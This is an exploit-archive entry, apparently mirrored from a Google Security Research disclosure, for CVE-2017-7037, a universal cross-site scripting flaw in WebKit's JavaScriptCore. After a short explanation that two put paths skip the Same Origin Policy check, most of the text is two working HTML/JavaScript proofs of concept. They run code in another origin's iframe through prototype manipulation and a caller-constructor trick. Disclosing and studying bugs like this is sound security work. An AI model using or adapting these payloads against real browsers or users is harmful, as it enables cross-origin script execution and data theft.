@@ -1,0 +1,69 @@
+id: 28186
+date: 07/25/2017
+title: WebKit JSC JSObject::putInlineSlow / JSValue::putToPrimitive XSS Vulnerability
+author: Google Security Research
+cves: CVE-2017-7037
+
+WebKit: JSC: UXSS via JSObject::putInlineSlow and JSValue::putToPrimitive 
+
+CVE-2017-7037
+
+
+JSObject::putInlineSlow and JSValue::putToPrimitive use getPrototypeDirect instead of getPrototype to get an object's prototype. So JSDOMWindow::getPrototype which checks the Same Origin Policy is not called.
+
+The PoC shows to call a setter of another origin's object.
+
+PoC 1 - JSValue::putToPrimitive:
+<body>
+<script>
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let loc = f.contentWindow.location;
+f.onload = () => {
+    let a = 1.2;
+    a.__proto__.__proto__ = f.contentWindow;
+
+    a['test'] = {toString: function () {
+        arguments.callee.caller.constructor('alert(location)')();
+    }};
+};
+f.src = 'data:text/html,' + `<iframe></iframe><script>
+Object.prototype.__defineSetter__('test', v => {
+    'a' + v;
+});
+
+</scrip` + `t>`;
+
+</script>
+</body>
+
+
+PoC 2 - JSObject::putInlineSlow:
+<body>
+<script>
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let loc = f.contentWindow.location;
+f.onload = () => {
+    let a = {
+        __proto__: f.contentWindow
+    };
+
+    a['test'] = {toString: function () {
+        arguments.callee.caller.constructor('alert(location)')();
+    }};
+};
+f.src = 'data:text/html,' + `<iframe></iframe><script>
+Object.prototype.__defineSetter__('test', v => {
+    'a' + v;
+});
+
+</scrip` + `t>`;
+</script>
+</body>
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
+
+#  0day.today [2023-03-23]  #
